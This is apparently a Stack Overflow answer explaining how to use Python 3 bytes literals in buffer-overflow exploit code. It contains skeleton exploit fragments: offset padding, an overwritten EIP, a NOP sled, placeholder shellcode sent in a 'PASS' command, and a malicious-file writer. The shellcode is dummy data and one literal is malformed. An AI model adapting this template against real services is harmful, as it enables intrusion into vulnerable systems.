
https://stackoverflow.com/questions/42615124/exploit-development-in-python-3

In Python 3, you want bytes objects instead, which you can creating by using b'...' byte string literals:

# --- SNIP ---
  shellcode =  b""
  shellcode += b"\x8\x4a\x4a"

# --- SNIP ---
  offset = b"A" * 2606
  eip = b"\x43\x62\x4b\x5f"
  nop = b"\x90" * 16
  padding = b"C"
  buff = offset + eip + nop + shellcode + padding * (424 - 351 - 16)

# --- SNIP ---
  bytes_sent = sock.send(b"PASS %s\r\n" % buff)

# --- SNIP ---
  bytes doesn't have a .format() method, but the % formatting operation is still available.

padding = b""
padding += b"A" * 2500
EIP = b"\x24\x22\x89\xab"
shellcode = b"\x1a\x2a\x3a\xbc"
nops = b"\x90" * 20

with open("test.3au", "wb") as f:
    f.write(padding + EIP + nops + shellcode)

# hexdump test.3au
# 0000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
# *
# 00009c0 41 41 41 41 24 22 89 ab 90 90 90 90 90 90 90 90
# 00009d0 90 90 90 90 90 90 90 90 90 90 90 90 1a 2a 3a bc
# 00009e0
